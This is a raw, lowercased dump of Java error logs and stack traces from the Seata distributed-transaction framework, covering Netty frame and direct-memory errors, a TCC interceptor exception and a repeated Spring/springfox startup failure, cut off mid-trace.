``` 2019-08-02 10:35:15.428 warn 17798 --- [nio-8084-exec-4] i.seata.spring.tcc.tccactioninterceptor : get method from interface failed java.lang.nosuchmethodexception: io.seata.sample.action.createordertccaction.tostring() at java.lang.class.getmethod(class.java:1786) ~[na:1.8.0_181] at io.seata.spring.tcc.tccactioninterceptor.getactioninterfacemethod(tccactioninterceptor.java:123) [seata-all-0.7.1.jar:0.7.1] at io.seata.spring.tcc.tccactioninterceptor.invoke(tccactioninterceptor.java:74) [seata-all-0.7.1.jar:0.7.1] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:185) [spring-aop-5.0.4.release.jar:5.0.4.release] at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:689) [spring-aop-5.0.4.release.jar:5.0.4.release] at io.seata.sample.action.createordertccactionimpl$$enhancerbyspringcglib$$d5ecf422.tostring(<generated>) [classes/:na] at io.seata.sample.service.businessservice.purchase(businessservice.java:39) [classes/:na]
**seata-server console oom**
2019-07-30 14:26:48.874 error[nettyservernioworker_8_8]io.seata.core.rpc.netty.abstractrpcremoting.exceptioncaught:424 -0318
java.lang.outofmemoryerror: direct buffer memory at java.base/java.nio.bits.reservememory(bits.java:175) at java.base/java.nio.directbytebuffer.<init>(directbytebuffer.java:118) at java.base/java.nio.bytebuffer.allocatedirect(bytebuffer.java:317) at io.netty.buffer.poolarena$directarena.allocatedirect(poolarena.java:764) at io.netty.buffer.poolarena$directarena.newchunk(poolarena.java:740) at io.netty.buffer.poolarena.allocatenormal(poolarena.java:244) at io.netty.buffer.poolarena.allocate(poolarena.java:214) at io.netty.buffer.poolarena.allocate(poolarena.java:146) at io.netty.buffer.pooledbytebufallocator.newdirectbuffer(pooledbytebufallocator.java:324) at io.netty.buffer.abstractbytebufallocator.directbuffer(abstractbytebufallocator.java:185) at io.netty.buffer.abstractbytebufallocator.directbuffer(abstractbytebufallocator.java:176) at io.netty.buffer.abstractbytebufallocator.iobuffer(abstractbytebufallocator.java:137) at io.netty.channel.defaultmaxmessagesrecvbytebufallocator$maxmessagehandle.allocate(defaultmaxmessagesrecvbytebufallocator.java:114) at io.netty.channel.nio.abstractniobytechannel$niobyteunsafe.read(abstractniobytechannel.java:147) at io.netty.channel.nio.nioeventloop.processselectedkey(nioeventloop.java:645) at io.netty.channel.nio.nioeventloop.processselectedkeysplain(nioeventloop.java:545) at io.netty.channel.nio.nioeventloop.processselectedkeys(nioeventloop.java:499) at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:459) at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:884) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.base/java.lang.thread.run(thread.java:835)
seta-server
io.seata.core.exception.transactionexception: null
at io.seata.server.coordinator.defaultcore.lambda$branchregister$0(defaultcore.java:79)
at io.seata.server.session.globalsession.lockandexcute(globalsession.java:594)
at io.seata.server.coordinator.defaultcore.branchregister(defaultcore.java:66)
at io.seata.server.coordinator.defaultcoordinator.dobranchregister(defaultcoordinator.java:174)
at io.seata.server.abstracttcinboundhandler$4.execute(abstracttcinboundhandler.java:148)
at io.seata.server.abstracttcinboundhandler$4.execute(abstracttcinboundhandler.java:144)
at io.seata.core.exception.abstractexceptionhandler.exceptionhandletemplate(abstractexceptionhandler.java:117)
at io.seata.server.abstracttcinboundhandler.handle(abstracttcinboundhandler.java:144)
at io.seata.core.protocol.transaction.branchregisterrequest.handle(branchregisterrequest.java:136)
at io.seata.server.coordinator.defaultcoordinator.onrequest(defaultcoordinator.java:430)
at io.seata.core.rpc.defaultservermessagelistenerimpl.ontrxmessage(defaultservermessagelistenerimpl.java:87)
at io.seata.core.rpc.netty.rpcserver.dispatch(rpcserver.java:252)
at io.seata.core.rpc.netty.abstractrpcremoting$3.run(abstractrpcremoting.java:371)
at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)
at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)
at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30)
at java.lang.thread.run(thread.java:748)
datavalidationandgoon
->if (!datacompareutils.isrecordsequals(afterrecords, currentrecords))
->comparerows(beforeimage.gettablemeta()
->throw new unsupportedoperationexception("xxx").
after comparing different versions of pom.xml, found that: version 0.6.1 and before:
<parent> <groupid>io.seata</groupid> <artifactid>seata-parent</artifactid> <version>0.6.1</version>
but version 0.7.0:
<parent> <groupid>io.seata</groupid> <artifactid>seata-metrics</artifactid> <version>${revision}</version>
2019-07-13 11:00:02.622 error[nettyservernioworker_2_8]io.seata.core.rpc.netty.abstractrpcremoting.exceptioncaught:424 -0318
io.netty.handler.codec.toolongframeexception: adjusted frame length exceeds 8388608: 2415945472 - discarded at io.netty.handler.codec.lengthfieldbasedframedecoder.fail(lengthfieldbasedframedecoder.java:522) at io.netty.handler.codec.lengthfieldbasedframedecoder.failifnecessary(lengthfieldbasedframedecoder.java:500) at io.netty.handler.codec.lengthfieldbasedframedecoder.exceededframelength(lengthfieldbasedframedecoder.java:387) at io.netty.handler.codec.lengthfieldbasedframedecoder.decode(lengthfieldbasedframedecoder.java:430) at io.seata.core.rpc.netty.v1.protocolv1decoder.decode(protocolv1decoder.java:75) at io.netty.handler.codec.lengthfieldbasedframedecoder.decode(lengthfieldbasedframedecoder.java:343) at io.netty.handler.codec.bytetomessagedecoder.decoderemovalreentryprotection(bytetomessagedecoder.java:502) at io.netty.handler.codec.bytetomessagedecoder.calldecode(bytetomessagedecoder.java:441) at io.netty.handler.codec.bytetomessagedecoder.channelread(bytetomessagedecoder.java:278) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:362) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:348) at io.netty.channel.abstractchannelhandlercontext.firechannelread(abstractchannelhandlercontext.java:340) at io.netty.handler.timeout.idlestatehandler.channelread(idlestatehandler.java:286) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:362) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:348) at io.netty.channel.abstractchannelhandlercontext.firechannelread(abstractchannelhandlercontext.java:340) at io.netty.channel.defaultchannelpipeline$headcontext.channelread(defaultchannelpipeline.java:1434) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:362) at io.netty.channel.abstractchannelhandlercontext.invokechannelread(abstractchannelhandlercontext.java:348) at io.netty.channel.defaultchannelpipeline.firechannelread(defaultchannelpipeline.java:965) at io.netty.channel.nio.abstractniobytechannel$niobyteunsafe.read(abstractniobytechannel.java:163) at io.netty.channel.nio.nioeventloop.processselectedkey(nioeventloop.java:645) at io.netty.channel.nio.nioeventloop.processselectedkeysoptimized(nioeventloop.java:580) at io.netty.channel.nio.nioeventloop.processselectedkeys(nioeventloop.java:497) at io.netty.channel.nio.nioeventloop.run(nioeventloop.java:459) at io.netty.util.concurrent.singlethreadeventexecutor$5.run(singlethreadeventexecutor.java:884) at io.netty.util.concurrent.fastthreadlocalrunnable.run(fastthreadlocalrunnable.java:30) at java.lang.thread.run(thread.java:745)
org.springframework.beans.factory.unsatisfieddependencyexception: error creating bean with name 'documentationpluginsbootstrapper' defined in url [jar:file:/d:/repo/io/springfox/springfox-spring-web/2.7.0/springfox-spring-web-2.7.0.jar!/springfox/documentation/spring/web/plugins/documentationpluginsbootstrapper.class]: unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.unsatisfieddependencyexception: error creating bean with name 'webmvcrequesthandlerprovider' defined in url [jar:file:/d:/repo/io/springfox/springfox-spring-web/2.7.0/springfox-spring-web-2.7.0.jar!/springfox/documentation/spring/web/plugins/webmvcrequesthandlerprovider.class]: unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'requestmappinghandlermapping' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.web.servlet.mvc.method.annotation.requestmappinghandlermapping]: factory method 'requestmappinghandlermapping' threw exception; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'mvcconversionservice' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.constructorresolver.createargumentarray(constructorresolver.java:749) at org.springframework.beans.factory.support.constructorresolver.autowireconstructor(constructorresolver.java:189) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.autowireconstructor(abstractautowirecapablebeanfactory.java:1198) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1100) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:511) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:481) at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:312) at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:308) at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:197) at org.springframework.beans.factory.support.defaultlistablebeanfactory.preinstantiatesingletons(defaultlistablebeanfactory.java:761) at org.springframework.context.support.abstractapplicationcontext.finishbeanfactoryinitialization(abstractapplicationcontext.java:867) at org.springframework.context.support.abstractapplicationcontext.refresh(abstractapplicationcontext.java:543) at org.springframework.boot.context.embedded.embeddedwebapplicationcontext.refresh(embeddedwebapplicationcontext.java:122) at org.springframework.boot.springapplication.refresh(springapplication.java:693) at org.springframework.boot.springapplication.refreshcontext(springapplication.java:360) at org.springframework.boot.springapplication.run(springapplication.java:303) at org.springframework.boot.springapplication.run(springapplication.java:1118) at org.springframework.boot.springapplication.run(springapplication.java:1107) at com.yhby.business.youboypay.web.youboypaywebapplication.main(youboypaywebapplication.java:29)
caused by: org.springframework.beans.factory.unsatisfieddependencyexception: error creating bean with name 'webmvcrequesthandlerprovider' defined in url [jar:file:/d:/repo/io/springfox/springfox-spring-web/2.7.0/springfox-spring-web-2.7.0.jar!/springfox/documentation/spring/web/plugins/webmvcrequesthandlerprovider.class]: unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'requestmappinghandlermapping' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.web.servlet.mvc.method.annotation.requestmappinghandlermapping]: factory method 'requestmappinghandlermapping' threw exception; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'mvcconversionservice' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.constructorresolver.createargumentarray(constructorresolver.java:749) at org.springframework.beans.factory.support.constructorresolver.autowireconstructor(constructorresolver.java:189) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.autowireconstructor(abstractautowirecapablebeanfactory.java:1198) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1100) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:511) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:481) at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:312) at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:308) at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:202) at org.springframework.beans.factory.config.dependencydescriptor.resolvecandidate(dependencydescriptor.java:208) at org.springframework.beans.factory.support.defaultlistablebeanfactory.addcandidateentry(defaultlistablebeanfactory.java:1314) at org.springframework.beans.factory.support.defaultlistablebeanfactory.findautowirecandidates(defaultlistablebeanfactory.java:1280) at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvemultiplebeans(defaultlistablebeanfactory.java:1178) at org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1094) at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1064) at org.springframework.beans.factory.support.constructorresolver.resolveautowiredargument(constructorresolver.java:835) at org.springframework.beans.factory.support.constructorresolver.createargumentarray(constructorresolver.java:741) ..
19 common frames omitted
caused by: org.springframework.beans.factory.beancreationexception: error creating bean with name 'requestmappinghandlermapping' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.web.servlet.mvc.method.annotation.requestmappinghandlermapping]: factory method 'requestmappinghandlermapping' threw exception; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'mvcconversionservice' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:599) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.instantiateusingfactorymethod(abstractautowirecapablebeanfactory.java:1178) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1072) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:511) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:481) at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:312) at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:308) at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:202) at org.springframework.beans.factory.config.dependencydescriptor.resolvecandidate(dependencydescriptor.java:208) at org.springframework.beans.factory.support.defaultlistablebeanfactory.addcandidateentry(defaultlistablebeanfactory.java:1314) at org.springframework.beans.factory.support.defaultlistablebeanfactory.findautowirecandidates(defaultlistablebeanfactory.java:1280) at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvemultiplebeans(defaultlistablebeanfactory.java:1178) at org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1094) at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1064) at org.springframework.beans.factory.support.constructorresolver.resolveautowiredargument(constructorresolver.java:835) at org.springframework.beans.factory.support.constructorresolver.createargumentarray(constructorresolver.java:741) ..
36 common frames omitted
caused by: org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.web.servlet.mvc.method.annotation.requestmappinghandlermapping]: factory method 'requestmappinghandlermapping' threw exception; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'mvcconversionservice' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:189) at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:588) ..
52 common frames omitted
caused by: org.springframework.beans.factory.beancreationexception: error creating bean with name 'mvcconversionservice' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:599) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.instantiateusingfactorymethod(abstractautowirecapablebeanfactory.java:1178) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1072) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:511) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:481) at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:312) at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:308) at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:197) at org.springframework.context.annotation.configurationclassenhancer$beanmethodinterceptor.obtainbeaninstancefromfactory(configurationclassenhancer.java:389) at org.springframework.context.annotation.configurationclassenhancer$beanmethodinterceptor.intercept(configurationclassenhancer.java:361) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26.mvcconversionservice(<generated>) at org.springframework.web.servlet.config.annotation.webmvcconfigurationsupport.getinterceptors(webmvcconfigurationsupport.java:307) at org.springframework.web.servlet.config.annotation.webmvcconfigurationsupport.requestmappinghandlermapping(webmvcconfigurationsupport.java:258) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration.requestmappinghandlermapping(webmvcautoconfiguration.java:403) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26.cglib$requestmappinghandlermapping$2(<generated>) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26$$fastclassbyspringcglib$$6aaa3019.invoke(<generated>) at org.springframework.cglib.proxy.methodproxy.invokesuper(methodproxy.java:228) at org.springframework.context.annotation.configurationclassenhancer$beanmethodinterceptor.intercept(configurationclassenhancer.java:358) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26.requestmappinghandlermapping(<generated>) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:162) ..
53 common frames omitted
caused by: org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:189) at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:588) ..
77 common frames omitted
caused by: java.lang.abstractmethoderror: null at org.springframework.web.servlet.config.annotation.webmvcconfigurercomposite.addformatters(webmvcconfigurercomposite.java:80) at org.springframework.web.servlet.config.annotation.delegatingwebmvcconfiguration.addformatters(delegatingwebmvcconfiguration.java:77) at org.springframework.web.servlet.config.annotation.webmvcconfigurationsupport.mvcconversionservice(webmvcconfigurationsupport.java:600) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26.cglib$mvcconversionservice$32(<generated>) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26$$fastclassbyspringcglib$$6aaa3019.invoke(<generated>) at org.springframework.cglib.proxy.methodproxy.invokesuper(methodproxy.java:228) at org.springframework.context.annotation.configurationclassenhancer$beanmethodinterceptor.intercept(configurationclassenhancer.java:358) at org.springframework.boot.autoconfigure.web.webmvcautoconfiguration$enablewebmvcconfiguration$$enhancerbyspringcglib$$e43fdb26.mvcconversionservice(<generated>) at sun.reflect.nativemethodaccessorimpl.invoke0(native method) at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) at java.lang.reflect.method.invoke(method.java:498) at org.springframework.beans.factory.support.simpleinstantiationstrategy.instantiate(simpleinstantiationstrategy.java:162) ..
78 common frames omitted 14814 [main] error o.s.boot.springapplication - application startup failed org.springframework.beans.factory.unsatisfieddependencyexception: error creating bean with name 'documentationpluginsbootstrapper' defined in url [jar:file:/d:/repo/io/springfox/springfox-spring-web/2.7.0/springfox-spring-web-2.7.0.jar!/springfox/documentation/spring/web/plugins/documentationpluginsbootstrapper.class]: unsatisfied dependency expressed through constructor parameter 1; nested exception is org.springframework.beans.factory.unsatisfieddependencyexception: error creating bean with name 'webmvcrequesthandlerprovider' defined in url [jar:file:/d:/repo/io/springfox/springfox-spring-web/2.7.0/springfox-spring-web-2.7.0.jar!/springfox/documentation/spring/web/plugins/webmvcrequesthandlerprovider.class]: unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'requestmappinghandlermapping' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.web.servlet.mvc.method.annotation.requestmappinghandlermapping]: factory method 'requestmappinghandlermapping' threw exception; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'mvcconversionservice' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.constructorresolver.createargumentarray(constructorresolver.java:749) at org.springframework.beans.factory.support.constructorresolver.autowireconstructor(constructorresolver.java:189) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.autowireconstructor(abstractautowirecapablebeanfactory.java:1198) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1100) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:511) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:481) at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:312) at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:308) at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:197) at org.springframework.beans.factory.support.defaultlistablebeanfactory.preinstantiatesingletons(defaultlistablebeanfactory.java:761) at org.springframework.context.support.abstractapplicationcontext.finishbeanfactoryinitialization(abstractapplicationcontext.java:867) at org.springframework.context.support.abstractapplicationcontext.refresh(abstractapplicationcontext.java:543) at org.springframework.boot.context.embedded.embeddedwebapplicationcontext.refresh(embeddedwebapplicationcontext.java:122) at org.springframework.boot.springapplication.refresh(springapplication.java:693) at org.springframework.boot.springapplication.refreshcontext(springapplication.java:360) at org.springframework.boot.springapplication.run(springapplication.java:303) at org.springframework.boot.springapplication.run(springapplication.java:1118) at org.springframework.boot.springapplication.run(springapplication.java:1107) at com.yhby.business.youboypay.web.youboypaywebapplication.main(youboypaywebapplication.java:29)
caused by: org.springframework.beans.factory.unsatisfieddependencyexception: error creating bean with name 'webmvcrequesthandlerprovider' defined in url [jar:file:/d:/repo/io/springfox/springfox-spring-web/2.7.0/springfox-spring-web-2.7.0.jar!/springfox/documentation/spring/web/plugins/webmvcrequesthandlerprovider.class]: unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'requestmappinghandlermapping' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.web.servlet.mvc.method.annotation.requestmappinghandlermapping]: factory method 'requestmappinghandlermapping' threw exception; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'mvcconversionservice' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.constructorresolver.createargumentarray(constructorresolver.java:749) at org.springframework.beans.factory.support.constructorresolver.autowireconstructor(constructorresolver.java:189) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.autowireconstructor(abstractautowirecapablebeanfactory.java:1198) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1100) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:511) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:481) at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:312) at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:308) at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:202) at org.springframework.beans.factory.config.dependencydescriptor.resolvecandidate(dependencydescriptor.java:208) at org.springframework.beans.factory.support.defaultlistablebeanfactory.addcandidateentry(defaultlistablebeanfactory.java:1314) at org.springframework.beans.factory.support.defaultlistablebeanfactory.findautowirecandidates(defaultlistablebeanfactory.java:1280) at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvemultiplebeans(defaultlistablebeanfactory.java:1178) at org.springframework.beans.factory.support.defaultlistablebeanfactory.doresolvedependency(defaultlistablebeanfactory.java:1094) at org.springframework.beans.factory.support.defaultlistablebeanfactory.resolvedependency(defaultlistablebeanfactory.java:1064) at org.springframework.beans.factory.support.constructorresolver.resolveautowiredargument(constructorresolver.java:835) at org.springframework.beans.factory.support.constructorresolver.createargumentarray(constructorresolver.java:741) ..
19 common frames omitted
caused by: org.springframework.beans.factory.beancreationexception: error creating bean with name 'requestmappinghandlermapping' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.web.servlet.mvc.method.annotation.requestmappinghandlermapping]: factory method 'requestmappinghandlermapping' threw exception; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'mvcconversionservice' defined in class path resource [org/springframework/boot/autoconfigure/web/webmvcautoconfiguration$enablewebmvcconfiguration.class]: bean instantiation via factory method failed; nested exception is org.springframework.beans.beaninstantiationexception: failed to instantiate [org.springframework.format.support.formattingconversionservice]: factory method 'mvcconversionservice' threw exception; nested exception is java.lang.abstractmethoderror at org.springframework.beans.factory.support.constructorresolver.instantiateusingfactorymethod(constructorresolver.java:599) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.instantiateusingfactorymethod(abstractautowirecapablebeanfactory.java:1178) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbeaninstance(abstractautowirecapablebeanfactory.java:1072) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.docreatebean(abstractautowirecapablebeanfactory.java:511) at org.springframework.beans.factory.support.abstractautowirecapablebeanfactory.createbean(abstractautowirecapablebeanfactory.java:481) at org.springframework.beans.factory.support.abstractbeanfactory$1.getobject(abstractbeanfactory.java:312) at org.springframework.beans.factory.support.defaultsingletonbeanregistry.getsingleton(defaultsingletonbeanregistry.java:230) at org.springframework.beans.factory.support.abstractbeanfactory.dogetbean(abstractbeanfactory.java:308) at org.springframework.beans.factory.support.abstractbeanfactory.getbean(abstractbeanfactory.java:202) at org.springframework.beans.factory.config.dependencydescriptor.resolvecandidate(dependencydescriptor.java:208) at 